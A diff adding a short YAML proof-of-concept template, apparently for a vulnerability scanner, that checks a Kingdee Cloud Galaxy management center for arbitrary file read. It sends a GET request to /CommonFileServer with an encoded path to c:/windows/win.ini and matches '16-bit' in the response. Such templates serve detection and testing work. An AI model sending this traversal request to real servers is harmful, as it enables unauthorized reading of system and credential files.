@@ -1,0 +1,9 @@
+name: poc-yaml-金蝶云星空管理中心-Diretory
+description: "任意文件读取"
+method: GET
+path:
+  - /CommonFileServer/c%3a%2fwindows%2fwin.ini
+expression:
+  status: 200
+  body_all:
+    - "16-bit"
